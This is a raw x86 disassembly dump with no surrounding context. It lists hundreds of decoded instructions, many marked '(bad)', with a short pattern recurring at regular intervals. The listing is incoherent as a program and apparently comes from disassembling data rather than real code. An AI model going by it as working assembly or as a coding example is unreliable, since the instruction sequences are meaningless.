  41dc02:	lods   al,BYTE PTR ds:[esi]
  41dc03:	mov    WORD PTR [edi],fs
  41dc05:	adc    DWORD PTR [ebx],edi
  41dc07:	mov    dh,0x94
  41dc09:	and    eax,0x7583c31d
  41dc0e:	sbb    esp,DWORD PTR [edi+0x61]
  41dc11:	inc    ebp
  41dc12:	xchg   ebx,eax
  41dc13:	(bad)  
  41dc14:	(bad)  [eax]
  41dc16:	sub    bh,BYTE PTR [edx]
  41dc18:	pop    ecx
  41dc19:	cld    
  41dc1a:	call   0x54dcad4e
  41dc1f:	or     esp,DWORD PTR [ecx+0x449b8221]
  41dc25:	jb     0x41dc02
  41dc27:	shl    BYTE PTR [ecx-0x2455473b],1
  41dc2d:	je     0x41dc58
  41dc2f:	xchg   ecx,eax
  41dc30:	xchg   ecx,eax
  41dc31:	xlat   BYTE PTR ds:[ebx]
  41dc32:	push   0x6e2c2165
  41dc37:	xchg   DWORD PTR [ecx-0x74],ebp
  41dc3a:	mov    cl,0xf3
  41dc3c:	cmp    ch,BYTE PTR [esi+0x1d]
  41dc3f:	xchg   BYTE PTR [edx],bl
  41dc41:	cmp    ebp,DWORD PTR [edi+0x4c6bd75c]
  41dc47:	sti    
  41dc48:	ja     0x41dc24
  41dc4a:	xor    al,0xfc
  41dc4c:	(bad)  [esi-0x500f67a2]
  41dc52:	call   0xbde3:0xb78ed48c
  41dc59:	jp     0x41dc30
  41dc5b:	dec    ecx
  41dc5c:	inc    ecx
  41dc5d:	ds xchg ebx,eax
  41dc5f:	and    dl,BYTE PTR [ecx+0x4957faf1]
  41dc65:	sar    BYTE PTR [ebx+0x3ea1e41d],1
  41dc6b:	ret    
  41dc6c:	lods   eax,DWORD PTR ds:[esi]
  41dc6d:	xchg   ecx,eax
	...
  41dcd6:	outs   dx,DWORD PTR ds:[esi]
  41dcd7:	retf   0x9815
  41dcda:	mov    ch,0xdf
  41dcdc:	out    dx,eax
  41dcdd:	jmp    DWORD PTR [edi-0x6a4f2fb0]
  41dce3:	xlat   BYTE PTR ds:[ebx]
  41dce4:	(bad)  
  41dce5:	push   ss
  41dce6:	addr16 inc eax
  41dce8:	add    DWORD PTR [eax],eax
  41dcea:	add    BYTE PTR [ecx],al
  41dcec:	add    BYTE PTR [eax],al
  41dcee:	out    0x5,eax
  41dcf0:	push   ss
  41dcf1:	mov    esp,ebx
  41dcf3:	jbe    0x41dcdd
  41dcf5:	cmp    ebx,edx
  41dcf7:	int3   
  41dcf8:	jecxz  0x41dcd4
  41dcfa:	jp     0x41dcc6
  41dcfc:	jnp    0x41dd52
  41dcfe:	pop    ecx
  41dcff:	push   0xffffff9c
  41dd01:	mov    esi,gs
  41dd03:	mov    cs,WORD PTR [ecx+0x2]
  41dd06:	pop    esi
  41dd07:	arpl   WORD PTR ds:0xa88e4e2a,bx
  41dd0d:	or     edi,DWORD PTR [edx+0x5592f4e3]
  41dd13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd14:	add    edx,DWORD PTR [edx]
  41dd16:	or     al,0xc3
  41dd18:	dec    ebp
  41dd19:	std    
  41dd1a:	popf   
  41dd1b:	mov    fs,WORD PTR [edx+0x4bbe5fcf]
  41dd21:	outs   dx,DWORD PTR ds:[esi]
  41dd22:	add    ecx,ebp
  41dd24:	or     eax,0x31997bc5
  41dd29:	rcl    DWORD PTR ds:0x8074eaff,0x98
  41dd30:	ret    0x85d7
  41dd33:	mov    eax,0xe2353671
  41dd38:	mov    ch,0x51
  41dd3a:	pop    ss
  41dd3b:	sbb    ecx,DWORD PTR [ecx]
  41dd3d:	jl     0x41dd43
  41dd3f:	test   al,0xb5
  41dd41:	xor    cl,BYTE PTR [esi-0x68]
  41dd44:	dec    esi
  41dd45:	mov    DWORD PTR [esi+0x6],ebp
  41dd48:	xchg   edi,eax
  41dd49:	mov    ebp,0x46151c19
  41dd4e:	call   0x429fd745
  41dd53:	imul   eax,DWORD PTR [edi],0xea2d2b5b
  41dd59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd5a:	jae    0x41dd75
  41dd5c:	inc    BYTE PTR [edi-0xf0e99e]
  41dd62:	jb     0x41ddde
  41dd64:	mov    edx,0x98de880a
  41dd69:	bound  eax,QWORD PTR [edi]
  41dd6b:	cmp    dh,BYTE PTR [esi]
  41dd6d:	jns    0x41dd9c
  41dd6f:	call   0x52ac653e
  41dd74:	dec    edi
  41dd75:	aas    
  41dd76:	lods   al,BYTE PTR ds:[esi]
  41dd77:	(bad)  [eax]
  41dd79:	mov    edx,esi
  41dd7b:	xor    edi,DWORD PTR [edx-0x27]
  41dd7e:	rol    BYTE PTR [ebx],cl
  41dd80:	(bad)  
  41dd81:	pop    ds
  41dd82:	rcr    BYTE PTR [esi],0x99
  41dd85:	fsubr  st(7),st
  41dd87:	or     DWORD PTR [ecx+0x68],ebp
  41dd8a:	nop
  41dd8b:	sub    cl,dh
  41dd8d:	xor    bl,BYTE PTR [edi-0x2ed92bc3]
  41dd93:	push   eax
  41dd94:	mov    al,ds:0x9129d1f
  41dd99:	out    0x8d,eax
  41dd9b:	pop    eax
  41dd9c:	cmp    BYTE PTR [edx],ah
  41dd9e:	jp     0x41ddd6
  41dda0:	pop    ebx
  41dda1:	das    
  41dda2:	jle    0x41ddff
  41dda4:	rcl    edi,0x1c
  41dda7:	xchg   edx,eax
  41dda8:	lods   al,BYTE PTR ds:[esi]
  41dda9:	cli    
  41ddaa:	out    dx,eax
  41ddab:	shr    DWORD PTR [ebp-0x5fc3e088],cl
  41ddb1:	sbb    al,0x68
  41ddb3:	pop    ds
  41ddb4:	cmp    eax,0xa654b8e1
  41ddb9:	test   al,0x51
  41ddbb:	fldl2e 
  41ddbd:	sub    al,0x13
  41ddbf:	scas   al,BYTE PTR es:[edi]
  41ddc0:	repz icebp 
  41ddc2:	(bad)  
  41ddc3:	push   esp
  41ddc4:	push   edi
  41ddc5:	pop    es
  41ddc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ddc7:	jmp    0xfc9111c7
  41ddcc:	dec    edx
  41ddcd:	add    eax,0x2b3233be
  41ddd2:	cmp    eax,0xab7dfa0c
  41ddd7:	ins    DWORD PTR es:[edi],dx
  41ddd8:	stos   DWORD PTR es:[edi],eax
  41ddd9:	int3   
  41ddda:	leave  
  41dddb:	in     al,dx
  41dddc:	push   edx
  41dddd:	dec    ebp
  41ddde:	jnp    0x41ddbf
  41dde0:	sub    esi,DWORD PTR [ecx]
  41dde2:	inc    eax
  41dde3:	(bad)  [ebp+0x6b]
  41dde6:	das    
  41dde7:	and    al,0xb4
  41dde9:	dec    esp
  41ddea:	repz jmp 0x41de58
  41dded:	jbe    0x41ddef
	...
  41de53:	add    BYTE PTR [eax],al
  41de55:	add    BYTE PTR [eax],ah
  41de57:	repz das 
  41de59:	cmp    bh,0xde
  41de5c:	lods   eax,DWORD PTR ds:[esi]
  41de5d:	repz pop ds
  41de5f:	mov    bl,BYTE PTR [esi-0x41]
  41de62:	fs xchg edi,eax
  41de64:	jb     0x41de4d
  41de66:	addr16 inc ecx
  41de68:	add    DWORD PTR [eax],eax
  41de6a:	add    BYTE PTR [ecx],al
  41de6c:	add    BYTE PTR [eax],al
  41de6e:	pushf  
  41de6f:	lea    eax,[eax]
  41de71:	xlat   BYTE PTR ds:[ebx]
  41de72:	push   ebx
  41de73:	es call 0x708ba374
  41de79:	hlt    
  41de7a:	cs (bad) 
  41de7c:	pop    esp
  41de7d:	loopne 0x41deba
  41de7f:	push   0x33fb9299
  41de84:	pusha  
  41de85:	jmp    0x41def6
  41de87:	mov    esp,0xc2ef9e99
  41de8c:	dec    eax
  41de8d:	retf   
  41de8e:	xor    eax,0xe14b7ca8
  41de93:	loop   0x41dee0
  41de95:	dec    ecx
  41de96:	inc    esp
  41de97:	dec    esi
  41de98:	sbb    BYTE PTR [eax],bh
  41de9a:	shr    DWORD PTR [edx+0x1e],cl
  41de9d:	adc    DWORD PTR [edi-0x4a],ecx
  41dea0:	sub    BYTE PTR [edx-0xf],ch
  41dea3:	int3   
  41dea4:	pop    ebx
  41dea5:	ds xor eax,0x8279fa9
  41deab:	imul   edx,DWORD PTR [edi+ebx*2-0x28],0xfffffff8
  41deb0:	pop    es
  41deb1:	jne    0x41decc
  41deb3:	ins    BYTE PTR es:[edi],dx
  41deb4:	jg     0x41def2
  41deb6:	mov    ch,0xab
  41deb8:	or     BYTE PTR [ebx+0x13],0x42
  41debc:	sub    al,0x5e
  41debe:	or     BYTE PTR [eax-0x7122ced3],al
  41dec4:	shl    BYTE PTR [eax],cl
  41dec6:	mov    dl,0x74
  41dec8:	mov    ds:0x44923b41,al
  41decd:	push   esp
  41dece:	ja     0x41debc
  41ded0:	in     al,0x1c
  41ded2:	std    
  41ded3:	or     eax,0xe9fdba0a
  41ded8:	dec    ebx
  41ded9:	out    dx,al
  41deda:	push   eax
  41dedb:	push   esp
  41dedc:	sbb    DWORD PTR [edi-0x6b],0x48
  41dee0:	xchg   ebp,eax
  41dee1:	xadd   ebp,eax
  41dee4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dee5:	fwait
  41dee6:	pop    ecx
  41dee7:	ins    DWORD PTR es:[edi],dx
  41dee8:	mov    gs,WORD PTR [eax+0x7eeea3c8]
  41deee:	jbe    0x41df37
  41def0:	cmp    ebx,DWORD PTR [edi+0x824b2c5]
  41def6:	(bad)  
  41def7:	in     eax,dx
  41def8:	xchg   edx,eax
  41def9:	inc    esi
  41defa:	pop    ebx
  41defb:	imul   BYTE PTR [ecx]
  41defd:	or     edx,DWORD PTR [eax+esi*4-0x10]
  41df01:	jmp    0x6c068f2f
  41df06:	es pusha 
  41df08:	dec    eax
  41df09:	ins    DWORD PTR es:[edi],dx
  41df0a:	sub    DWORD PTR [ecx-0x7a53a8e0],ebp
  41df10:	cmc    
  41df11:	stos   DWORD PTR es:[edi],eax
  41df12:	sbb    dh,BYTE PTR [edx-0x29]
  41df15:	stc    
  41df16:	push   ecx
  41df17:	js     0x41defc
  41df19:	repnz inc edi
  41df1b:	imul   ebx,DWORD PTR [ebx-0x69d7dc3c],0x8aad90fd
  41df25:	or     ebx,DWORD PTR [ebx]
  41df27:	in     al,dx
  41df28:	mov    esi,0xe1eae688
  41df2d:	sub    BYTE PTR [ebx-0x7f],cl
  41df30:	add    al,0xbe
  41df32:	(bad)  [eax]
  41df34:	or     eax,0x66a7413d
  41df39:	in     al,dx
  41df3a:	xchg   DWORD PTR [edi+0x4e],esp
  41df3d:	mov    edi,0x2d8b574a
  41df42:	retf   
  41df43:	mov    dl,0x80
  41df45:	jb     0x41dfb2
  41df47:	inc    ecx
  41df48:	shl    DWORD PTR [edi],cl
  41df4a:	and    edi,DWORD PTR [ebx-0x47ccd8f5]
  41df50:	mov    edi,0xde26a671
  41df55:	pop    es
  41df56:	adc    DWORD PTR [eax-0x13],edx
  41df59:	xor    eax,0x514d185
  41df5e:	sbb    BYTE PTR [esi],cl
  41df60:	sbb    al,0x9f
  41df62:	jne    0x41df63
  41df64:	push   ss
  41df65:	push   ds
  41df66:	push   0xffffffc0
  41df68:	out    0x48,eax
  41df6a:	out    dx,al
  41df6b:	and    ah,BYTE PTR [ecx+0xea]
	...
  41dfd5:	add    BYTE PTR [edi],bh
  41dfd7:	daa    
  41dfd8:	push   ss
  41dfd9:	cld    
  41dfda:	push   ds
  41dfdb:	std    
  41dfdc:	jmp    edi
  41dfde:	dec    edi
  41dfdf:	push   0x64129ce9
  41dfe4:	out    0xbb,al
  41dfe6:	addr16 inc edx
  41dfe8:	add    DWORD PTR [eax],eax
  41dfea:	add    BYTE PTR [ecx],al
  41dfec:	add    BYTE PTR [eax],al
  41dfee:	xor    cl,0x64
  41dff1:	fstp   QWORD PTR [eax+ebx*8]
  41dff4:	and    eax,DWORD PTR [eax]
  41dff6:	dec    ebx
  41dff7:	(bad)  
  41dff8:	stos   DWORD PTR es:[edi],eax
  41dff9:	out    dx,al
  41dffa:	jns    0x41e017
  41dffc:	fdiv   st,st(5)
  41dffe:	mov    bh,0x3f
  41e000:	pop    ss
  41e001:	push   ss
  41e002:	std    
  41e003:	call   0xa89:0x9d47467c
  41e00a:	and    al,0x8f
  41e00c:	xchg   BYTE PTR [edx+eiz*8],al
  41e00f:	ja     0x41df9d
  41e011:	cmp    ecx,DWORD PTR [edx+0x6d367359]
  41e017:	fisttp WORD PTR [edx]
  41e019:	push   edi
  41e01a:	in     al,0x20
  41e01c:	dec    ecx
  41e01d:	push   eax
  41e01e:	stos   BYTE PTR es:[edi],al
  41e01f:	(bad)  
  41e020:	sub    bh,0x5d
  41e023:	or     DWORD PTR [esi+0x7f],ebx
  41e026:	mov    al,BYTE PTR [edi]
  41e028:	(bad)  
  41e029:	jnp    0x41e061
  41e02b:	xor    edi,DWORD PTR ds:[ebx-0x6475f4fb]
  41e032:	inc    edi
  41e033:	add    dl,BYTE PTR [eax]
  41e035:	int    0xb7
  41e037:	adc    al,0x35
  41e039:	jno    0x41e030
  41e03b:	adc    al,BYTE PTR [edi-0x3b604d84]
  41e041:	repz or al,BYTE PTR [ebp+0x44f87a5e]
  41e048:	add    edi,edi
  41e04a:	les    esi,FWORD PTR [edi]
  41e04c:	pop    edx
  41e04d:	lea    ebp,[ebx+0x50]
  41e050:	and    ah,BYTE PTR [eax]
  41e052:	arpl   WORD PTR [eax-0x50],bx
  41e055:	xor    BYTE PTR [ebx-0x5],ch
  41e058:	inc    eax
  41e059:	dec    edx
  41e05a:	dec    ecx
  41e05b:	pop    ebx
  41e05c:	pop    ebx
  41e05d:	xlat   BYTE PTR ds:[ebx]
  41e05e:	mov    ch,BYTE PTR [ecx]
  41e060:	xor    ecx,DWORD PTR [ecx]
  41e062:	retf   
  41e063:	jnp    0x41e0e1
  41e065:	test   DWORD PTR [ecx+ebp*8+0x4735ebcd],ecx
  41e06c:	sub    al,0x37
  41e06e:	scas   eax,DWORD PTR es:[edi]
  41e06f:	inc    esp
  41e070:	mov    ebp,0x7dfda532
  41e075:	jnp    0x41e034
  41e077:	test   al,0xeb
  41e079:	aam    0xa1
  41e07b:	adc    esp,esi
  41e07d:	mov    WORD PTR [ebp+0x19],cs
  41e080:	mov    dl,0x32
  41e082:	push   ss
  41e083:	mov    BYTE PTR [ebx-0x1b],dl
  41e086:	ret    0x848a
  41e089:	and    eax,0x82b2048f
  41e08e:	(bad)  
  41e08f:	jecxz  0x41e01e
  41e091:	ror    DWORD PTR [esi-0x52],0x5e
  41e095:	loope  0x41e0ca
  41e097:	lods   eax,DWORD PTR ds:[si]
  41e099:	pop    ebp
  41e09a:	cmp    DWORD PTR [esi],eax
  41e09c:	pop    edi
  41e09d:	jle    0x41e0b0
  41e09f:	or     eax,0x1cfa3d71
  41e0a4:	dec    edi
  41e0a5:	mov    es,esp
  41e0a7:	cmp    cl,ch
  41e0a9:	loop   0x41e118
  41e0ab:	cs jmp 0x4bc204
  41e0b1:	mov    al,ds:0xfc97c840
  41e0b6:	ins    BYTE PTR es:[edi],dx
  41e0b7:	mov    esp,0xdef02487
  41e0bc:	sahf   
  41e0bd:	and    eax,DWORD PTR [eax-0x49]
  41e0c0:	jbe    0x41e0db
  41e0c2:	sub    eax,0x94b47af3
  41e0c7:	xchg   ebp,eax
  41e0c8:	ret    
  41e0c9:	mov    ebp,DWORD PTR [ebx]
  41e0cb:	and    DWORD PTR [esi+0x48],ebx
  41e0ce:	lods   al,BYTE PTR ds:[esi]
  41e0cf:	cmp    ebp,DWORD PTR [ecx+0x6b16bd1f]
  41e0d5:	sbb    esi,DWORD PTR [ecx+0x2b]
  41e0d8:	pop    esp
  41e0d9:	and    al,0xcf
  41e0db:	test   BYTE PTR [edx+eiz*4],0x96
  41e0df:	popf   
  41e0e0:	push   ss
  41e0e1:	clc    
  41e0e2:	stc    
  41e0e3:	imul   esi,DWORD PTR [esi-0x596f5f3],0x3b96caae
  41e0ed:	jo     0x41e0ef
	...
  41e153:	add    BYTE PTR [eax],al
  41e155:	add    BYTE PTR [edi+0x53],cl
  41e158:	add    al,0xc
  41e15a:	sbb    al,0x5f
  41e15c:	dec    edi
  41e15d:	push   ebx
  41e15e:	out    0x6d,eax
  41e160:	aad    0x48
  41e162:	push   ecx
  41e163:	push   esi
  41e164:	cdq    
  41e165:	cmp    DWORD PTR [edi+0x43],esp
  41e168:	add    DWORD PTR [eax],eax
  41e16a:	add    BYTE PTR [ecx],al
  41e16c:	add    BYTE PTR [eax],al
  41e16e:	and    ecx,DWORD PTR [ecx]
  41e170:	sbb    dl,al
  41e172:	ds mov ebp,0x71133e8a
  41e178:	fs out dx,al
  41e17a:	in     eax,0x5c
  41e17c:	js     0x41e1fc
  41e17e:	(bad)  
  41e17f:	sub    eax,0xdecda244
  41e184:	popa   
  41e185:	pop    ecx
  41e186:	sbb    DWORD PTR [edx+ebp*8+0x2c],0x6e
  41e18b:	mov    bh,0xf
  41e18d:	sbb    DWORD PTR [ebx-0x33],edi
  41e190:	leave  
  41e191:	or     DWORD PTR [edx-0x2d6f37e1],0xe296d539
  41e19b:	lea    edi,[ecx]
  41e19d:	cmp    esi,ecx
  41e19f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1a0:	jne    0x41e136
  41e1a2:	push   ecx
  41e1a3:	inc    edx
  41e1a4:	mov    ds:0xd91fb1d6,al
  41e1a9:	out    dx,al
  41e1aa:	cmp    DWORD PTR [edi+0x378bb67b],ecx
  41e1b0:	lock test BYTE PTR [esi-0x4b],0x7f
  41e1b5:	(bad)  
  41e1b7:	pop    edi
  41e1b8:	sbb    eax,0xce8bae70
  41e1bd:	pusha  
  41e1be:	ror    BYTE PTR [ecx+0x1b],0x62
  41e1c2:	rol    DWORD PTR [ebp+0x7d],0x79
  41e1c6:	dec    esp
  41e1c7:	jbe    0x41e1e4
  41e1c9:	repz sbb eax,0x314528c9
  41e1cf:	(bad)
  41e1d2:	ror    BYTE PTR ds:0xe48f96cb,1
  41e1d8:	movd   mm7,DWORD PTR [esi+0x50]
  41e1dc:	call   ecx
  41e1de:	jecxz  0x41e16e
  41e1e0:	mov    bh,0xb6
  41e1e2:	jmp    0x41e170
  41e1e4:	xchg   esi,eax
  41e1e5:	dec    esi
  41e1e6:	int    0x1f
  41e1e8:	sub    BYTE PTR [ebp+0x253a834c],dl
  41e1ee:	or     ch,bh
  41e1f0:	daa    
  41e1f1:	xor    WORD PTR [ebx],di
  41e1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1f5:	mov    dh,0xcc
  41e1f7:	inc    edx
  41e1f8:	adc    BYTE PTR [ebp+0x5d],0x72
  41e1fc:	mov    esi,ecx
  41e1fe:	mov    ch,0x34
  41e200:	mov    al,0x3b
  41e202:	repnz aam 0x29
  41e205:	std    
  41e206:	test   BYTE PTR [edi-0x54],bh
  41e209:	icebp  
  41e20a:	pop    ecx
  41e20b:	xchg   ecx,eax
  41e20c:	pop    ebx
  41e20d:	(bad)  [edx-0x62]
  41e210:	inc    esi
  41e211:	xor    DWORD PTR [esi],edx
  41e213:	pusha  
  41e214:	test   BYTE PTR [ebx],bh
  41e216:	pop    ebp
  41e217:	(bad)  
  41e218:	push   ebp
  41e219:	cmp    BYTE PTR [ebx-0x27],dl
  41e21c:	mov    al,0xf6
  41e21e:	neg    BYTE PTR [ebp+0x689cbe22]
  41e224:	pusha  
  41e225:	(bad)  
  41e227:	dec    edx
  41e228:	cmp    DWORD PTR ds:0x28389428,edx
  41e22e:	loop   0x41e22b
  41e230:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41e232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e233:	retf   
  41e234:	xchg   edi,eax
  41e235:	popf   
  41e236:	add    cl,bl
  41e238:	xor    eax,0xc9435105
  41e23d:	pop    ecx
  41e23e:	cwde   
  41e23f:	push   edx
  41e240:	and    ebp,eax
  41e242:	test   BYTE PTR [edi-0x5d],dh
  41e245:	enter  0x4b6c,0xb9
  41e249:	test   BYTE PTR [edi+ecx*4-0x317877f2],ah
  41e250:	xchg   esi,eax
  41e251:	loopne 0x41e272
  41e253:	push   esi
  41e254:	fist   DWORD PTR [edx-0x2f]
  41e257:	xchg   esi,eax
  41e258:	push   0xeed6377a
  41e25d:	fild   DWORD PTR es:[eax]
  41e260:	clc    
  41e261:	cmovg  ecx,DWORD PTR [edi-0x4d]
  41e265:	pop    esp
  41e266:	cdq    
  41e267:	push   0xba817266
  41e26c:	icebp  
  41e26d:	iret   
	...
  41e2d6:	stos   DWORD PTR es:[edi],eax
  41e2d7:	add    dh,BYTE PTR [edi-0x1a]
  41e2da:	push   edi
  41e2dc:	mov    ebx,0x6f64c34f
  41e2e1:	or     al,0x63
  41e2e3:	sub    DWORD PTR [ebx],esi
  41e2e5:	pop    es
  41e2e6:	addr16 inc esp
  41e2e8:	add    DWORD PTR [eax],eax
  41e2ea:	add    BYTE PTR [ecx],al
  41e2ec:	add    BYTE PTR [eax],al
  41e2ee:	xchg   ebp,eax
  41e2ef:	sti    
  41e2f0:	out    0xda,al
  41e2f2:	icebp  
  41e2f3:	pop    ecx
  41e2f4:	stc    
  41e2f5:	ror    esp,1
  41e2f7:	cdq    
  41e2f8:	(bad)  
  41e2f9:	sub    BYTE PTR [eax],ch
  41e2fb:	inc    ebp
  41e2fc:	xor    DWORD PTR [edx+0x4c672fa],ecx
  41e302:	xchg   dh,al
  41e304:	mov    dl,0xa1
  41e306:	das    
  41e307:	xchg   ebx,eax
  41e308:	pusha  
  41e309:	xchg   edx,edi
  41e30b:	repnz push 0x3f
  41e30e:	xchg   ebx,eax
  41e30f:	mov    al,0xe8
  41e311:	or     eax,0xfe717148
  41e316:	out    0xcc,eax
  41e318:	push   edx
  41e319:	je     0x41e29f
  41e31b:	cwde   
  41e31c:	cmp    dh,al
  41e31e:	xchg   edx,eax
  41e31f:	xor    ebp,esp
  41e321:	xchg   ebp,eax
  41e322:	stc    
  41e323:	shl    DWORD PTR [ebx+0x73d90539],0xa9
  41e32a:	and    DWORD PTR [edi+ecx*1-0x23],edi
  41e32e:	sub    eax,0xce9d0640
  41e333:	push   ss
  41e334:	stc    
  41e335:	vcvtsi2sd xmm0,xmm6,DWORD PTR [ebx-0x36]
  41e33a:	jmp    0x5f3:0x21b8bf3e
  41e341:	pop    edi
  41e342:	call   0x4c77:0x85cbd391
  41e349:	cdq    
  41e34a:	xor    DWORD PTR [edx-0x1c],edi
  41e34d:	push   edx
  41e34e:	add    BYTE PTR [ebx],al
  41e350:	ja     0x41e38b
  41e352:	mov    eax,ds:0xbdf5d2aa
  41e357:	mov    eax,0xac14c39a
  41e35c:	popa   
  41e35d:	mul    DWORD PTR cs:[ecx-0x301b2934]
  41e364:	mov    DWORD PTR [ecx+eiz*4+0x3f52d7ae],eax
  41e36b:	es stos DWORD PTR es:[edi],eax
  41e36d:	adc    bl,ah
  41e36f:	xor    eax,0x5acf19dd
  41e374:	mov    ebp,0xc576611c
  41e379:	or     BYTE PTR [edi+0x39],ch
  41e37c:	add    dl,bh
  41e37e:	out    dx,eax
  41e37f:	mov    BYTE PTR [esp+ecx*8],bl
  41e382:	dec    esp
  41e383:	or     ah,BYTE PTR [edx]
  41e385:	xor    eax,DWORD PTR [ecx-0x8]
  41e388:	stos   BYTE PTR es:[edi],al
  41e389:	adc    al,0x15
  41e38b:	push   ebx
  41e38c:	fidiv  WORD PTR [edi]
  41e38e:	and    eax,ebx
  41e390:	cmp    BYTE PTR [edx],0x30
  41e393:	xchg   ecx,eax
  41e394:	sub    DWORD PTR [esi-0x7c],edx
  41e397:	iret   
  41e398:	mov    ebx,edx
  41e39a:	ret    
  41e39b:	loopne 0x41e402
  41e39d:	cmp    edi,DWORD PTR [eax]
  41e39f:	push   ecx
  41e3a0:	ficom  WORD PTR [ecx-0x1b]
  41e3a3:	mov    BYTE PTR [edi],bh
  41e3a5:	sbb    BYTE PTR [edx],0xd6
  41e3a8:	bound  ebx,QWORD PTR es:[ebx-0x20938599]
  41e3af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3b0:	sbb    esi,0x7cbd7ad2
  41e3b6:	or     bh,BYTE PTR [ecx+0x47]
  41e3b9:	jecxz  0x41e3cd
  41e3bb:	mov    WORD PTR [eax-0x7fa7a27],ss
  41e3c1:	scas   al,BYTE PTR es:[edi]
  41e3c2:	ficomp DWORD PTR [eax+0xd]
  41e3c5:	repz lock mov edx,0x5cd7ce15
  41e3cc:	test   DWORD PTR [eax],0x23c62ee8
  41e3d2:	jo     0x41e3c0
  41e3d4:	test   DWORD PTR [eax+esi*2-0x51],ebx
  41e3d8:	sbb    ch,BYTE PTR [ebx]
  41e3da:	adc    eax,esp
  41e3dc:	rol    DWORD PTR [ebx+0x29],cl
  41e3df:	add    eax,eax
  41e3e1:	adc    BYTE PTR [edi+0x47db8d7b],bl
  41e3e7:	shr    eax,0xa8
  41e3ea:	ins    DWORD PTR es:[edi],dx
  41e3eb:	push   ds
  41e3ec:	pop    eax
  41e3ed:	mov    eax,DWORD PTR [eax]
	...
  41e453:	add    BYTE PTR [eax],al
  41e455:	add    BYTE PTR [ecx-0xe088ee],cl
  41e45b:	jg     0x41e446
  41e45d:	xchg   esi,eax
  41e45e:	or     DWORD PTR [edx+0x18],0x6ceafb09
  41e465:	daa    
  41e466:	addr16 inc ebp
  41e468:	add    DWORD PTR [eax],eax
  41e46a:	add    BYTE PTR [ecx],al
  41e46c:	add    BYTE PTR [eax],al
  41e46e:	jnp    0x41e4a7
  41e470:	jne    0x41e4d5
  41e472:	push   ebx
  41e473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e474:	call   0x48dd064b
  41e479:	retf   
  41e47a:	sbb    DWORD PTR [edi-0x29],eax
  41e47d:	adc    DWORD PTR [ebp-0x16a31ed7],ecx
  41e483:	rcl    DWORD PTR [ebx+edi*8-0x76],cl
  41e487:	mov    bl,cl
  41e489:	inc    edx
  41e48a:	dec    edx
  41e48b:	mov    cl,0x8b
  41e48d:	cmp    DWORD PTR cs:[edx+0x1c],esi
  41e491:	into   
  41e492:	mov    dl,0xb6
  41e494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e495:	adc    al,0xa8
  41e497:	xchg   edi,eax
  41e498:	cld    
  41e499:	call   0xcece:0x24079bdc
  41e4a0:	icebp  
  41e4a1:	add    esp,DWORD PTR [ebx]
  41e4a3:	sbb    ecx,DWORD PTR [edx+0x2e]
  41e4a6:	mov    eax,0x9ea98bf6
  41e4ab:	aaa    
  41e4ac:	mov    WORD PTR [edx+0x4daa3e8c],cs
  41e4b2:	push   cs
  41e4b3:	mov    al,ds:0xe2d8af8
  41e4b8:	mov    BYTE PTR [esi-0x52],0xa0
  41e4bc:	lods   al,BYTE PTR ds:[esi]
  41e4bd:	pop    ebp
  41e4be:	js     0x41e48d
  41e4c0:	push   edx
  41e4c1:	jp     0x41e480
  41e4c3:	pop    ss
  41e4c4:	push   0xaeeb2dd4
  41e4c9:	jne    0x41e4fc
  41e4cb:	mov    esi,0x545c6004
  41e4d0:	ins    DWORD PTR es:[edi],dx
  41e4d1:	xchg   DWORD PTR [ebp-0x1a],esi
  41e4d4:	jecxz  0x41e460
  41e4d6:	adc    ch,BYTE PTR [eax+0x53877253]
  41e4dc:	cs loopne 0x41e4db
  41e4df:	rcl    BYTE PTR [ecx],cl
  41e4e1:	imul   esp,esi,0x1e
  41e4e4:	sub    BYTE PTR [ebp-0xd],dl
  41e4e7:	cwde   
  41e4e8:	mov    esi,0x63cee51
  41e4ed:	dec    edx
  41e4ee:	repnz pop esi
  41e4f0:	ror    DWORD PTR [ecx+ebp*1],cl
  41e4f3:	push   0xc6b0fdb
  41e4f8:	mov    BYTE PTR [eax],bl
  41e4fa:	push   0x65089292
  41e4ff:	dec    ebp
  41e500:	std    
  41e501:	je     0x41e56e
  41e503:	pop    ebx
  41e504:	sbb    al,0xaf
  41e506:	or     dh,ah
  41e508:	jmp    DWORD PTR [eax]
  41e50a:	inc    edx
  41e50b:	lods   al,BYTE PTR ds:[esi]
  41e50c:	and    ah,BYTE PTR [ebx-0x7f]
  41e50f:	test   DWORD PTR [esi+ebx*1-0x26],ecx
  41e513:	xchg   bh,cl
  41e515:	xor    DWORD PTR [ebx-0x1e1518f3],ecx
  41e51b:	fsubr  st,st(2)
  41e51d:	js     0x41e4fc
  41e51f:	sbb    BYTE PTR [edx-0x5d],bh
  41e522:	cld    
  41e523:	mov    al,0x34
  41e525:	sbb    BYTE PTR [ecx+0x6c],0x47
  41e529:	cmp    al,0x8c
  41e52b:	ds inc eax
  41e52d:	add    DWORD PTR [edi+0x6af23147],0x13
  41e534:	push   cs
  41e535:	fadd   DWORD PTR [ebx+0x6fd030b5]
  41e53b:	scas   al,BYTE PTR es:[edi]
  41e53c:	or     ebp,0x77
  41e53f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e540:	add    BYTE PTR [edi-0x784241c9],0x1d
  41e547:	fwait
  41e548:	pop    edi
  41e549:	ins    BYTE PTR es:[edi],dx
  41e54a:	dec    ecx
  41e54b:	lods   al,BYTE PTR ds:[esi]
  41e54c:	stc    
  41e54d:	fs pop ecx
  41e54f:	push   ds
  41e550:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e551:	xor    eax,0x53951f65
  41e556:	mov    dl,0x31
  41e558:	in     eax,dx
  41e559:	arpl   WORD PTR [esi+0x63],bp
  41e55c:	fcom   DWORD PTR [esi-0x64]
  41e55f:	stc    
  41e560:	xbegin 0xa623c98d
  41e566:	inc    edx
  41e567:	repz mov edi,0x5b9710d
  41e56d:	sub    eax,DWORD PTR [eax]
	...
